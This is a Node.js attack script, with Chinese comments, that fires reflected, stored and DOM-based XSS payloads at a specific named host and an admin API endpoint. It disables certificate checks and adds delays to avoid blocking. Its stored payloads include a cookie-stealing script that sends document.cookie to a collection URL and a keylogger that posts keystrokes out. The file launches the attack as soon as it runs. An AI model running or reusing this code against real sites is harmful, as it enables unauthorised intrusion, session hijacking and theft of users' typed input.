// xss-attack.js
const axios = require('axios');
const https = require('https');

class XSSAttacker {
    constructor(baseUrl, apiUrl) {
        this.baseUrl = baseUrl;
        this.apiUrl = apiUrl;
        this.axiosInstance = axios.create({
            httpsAgent: new https.Agent({  
                rejectUnauthorized: false
            }),
            timeout: 10000
        });
    }

    // 测试反射型XSS
    async testReflectiveXSS() {
        console.log('=== 反射型XSS测试 ===');
        
        const xssPayloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(2)>',
            'javascript:alert(3)',
            '"onmouseover="alert(4)',
            '<iframe src="javascript:alert(5)">',
            '<body onload=alert(6)>',
            '<a href="javascript:alert(7)">click</a>'
        ];

        // 测试URL参数
        const testUrls = [
            `${this.baseUrl}?search=`,
            `${this.baseUrl}?q=`,
            `${this.baseUrl}?keyword=`,
            `${this.apiUrl}?id=`
        ];

        for (const url of testUrls) {
            for (const payload of xssPayloads) {
                try {
                    const testUrl = url + encodeURIComponent(payload);
                    console.log(`测试: ${testUrl.substring(0, 100)}...`);
                    
                    const response = await this.axiosInstance.get(testUrl, {
                        validateStatus: () => true
                    });
                    
                    // 检查响应中是否包含未编码的payload
                    if (response.data && response.data.includes(payload.replace('<script>', '').replace('</script>', ''))) {
                        console.log(`🚨 可能的XSS漏洞: ${payload}`);
                        console.log(`URL: ${testUrl}`);
                    }
                    
                } catch (error) {
                    console.log(`请求失败: ${error.message}`);
                }
                await this.delay(500); // 延迟避免被封
            }
        }
    }

    // 测试存储型XSS
    async testStoredXSS() {
        console.log('\n=== 存储型XSS测试 ===');
        
        const storedPayloads = [
            {
                name: '简单alert',
                payload: '<script>alert("Stored XSS")</script>'
            },
            {
                name: '图片onerror',
                payload: '<img src="invalid" onerror="fetch(\'https://test.xuandou.vip:107/\')">'
            },
            {
                name: '窃取Cookie',
                payload: '<script>var i=new Image;i.src="http://localhost:3000/steal?c="+document.cookie</script>'
            },
            {
                name: '键盘记录',
                payload: `<script>
                    var k='';
                    document.onkeypress=function(e){k+=String.fromCharCode(e.keyCode);
                    if(k.length>100){fetch('http://localhost:3000/log',{method:'POST',body:k});k=''}}
                </script>`
            }
        ];

        // 尝试通过API提交恶意数据
        for (const test of storedPayloads) {
            console.log(`尝试存储型XSS: ${test.name}`);
            
            try {
                // 尝试POST请求
                const response = await this.axiosInstance.post(this.apiUrl, {
                    content: test.payload,
                    title: test.payload,
                    message: test.payload
                }, {
                    validateStatus: () => true
                });
                
                console.log(`响应状态: ${response.status}`);
                
                if (response.status === 200) {
                    console.log(`⚠️  可能成功提交恶意数据`);
                }
                
            } catch (error) {
                console.log(`提交失败: ${error.message}`);
            }
            
            await this.delay(1000);
        }
    }

    // DOM型XSS测试
    async testDOMXSS() {
        console.log('\n=== DOM型XSS测试 ===');
        
        const domPayloads = [
            '#<script>alert(1)</script>',
            'javascript:alert(2)',
            'data:text/html,<script>alert(3)</script>',
            '<img src=x onerror=alert(4)>'
        ];

        const hashTestUrl = this.baseUrl;
        
        for (const payload of domPayloads) {
            try {
                const testUrl = `${hashTestUrl}#${payload}`;
                console.log(`测试hash: ${testUrl}`);
                
                const response = await this.axiosInstance.get(testUrl, {
                    validateStatus: () => true
                });
                
                // 检查响应中是否有hash相关代码
                if (response.data && response.data.includes('location.hash') || 
                    response.data && response.data.includes('window.location')) {
                    console.log(`⚠️  可能存在DOM XSS: 使用了location相关操作`);
                }
                
            } catch (error) {
                console.log(`测试失败: ${error.message}`);
            }
        }
    }

    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // 执行所有XSS测试
    async launchAllXSSAttacks() {
        console.log('开始XSS攻击测试...\n');
        
        await this.testReflectiveXSS();
        await this.testStoredXSS();
        await this.testDOMXSS();
        
        console.log('\nXSS攻击测试完成');
    }
}

// 执行XSS攻击
const xssAttacker = new XSSAttacker(
    'https://test.xuandou.vip:107/',
    'https://test.xuandou.vip:48082/admin-api/teacher/home/message-notification-details-by-teacher'
);

xssAttacker.launchAllXSSAttacks();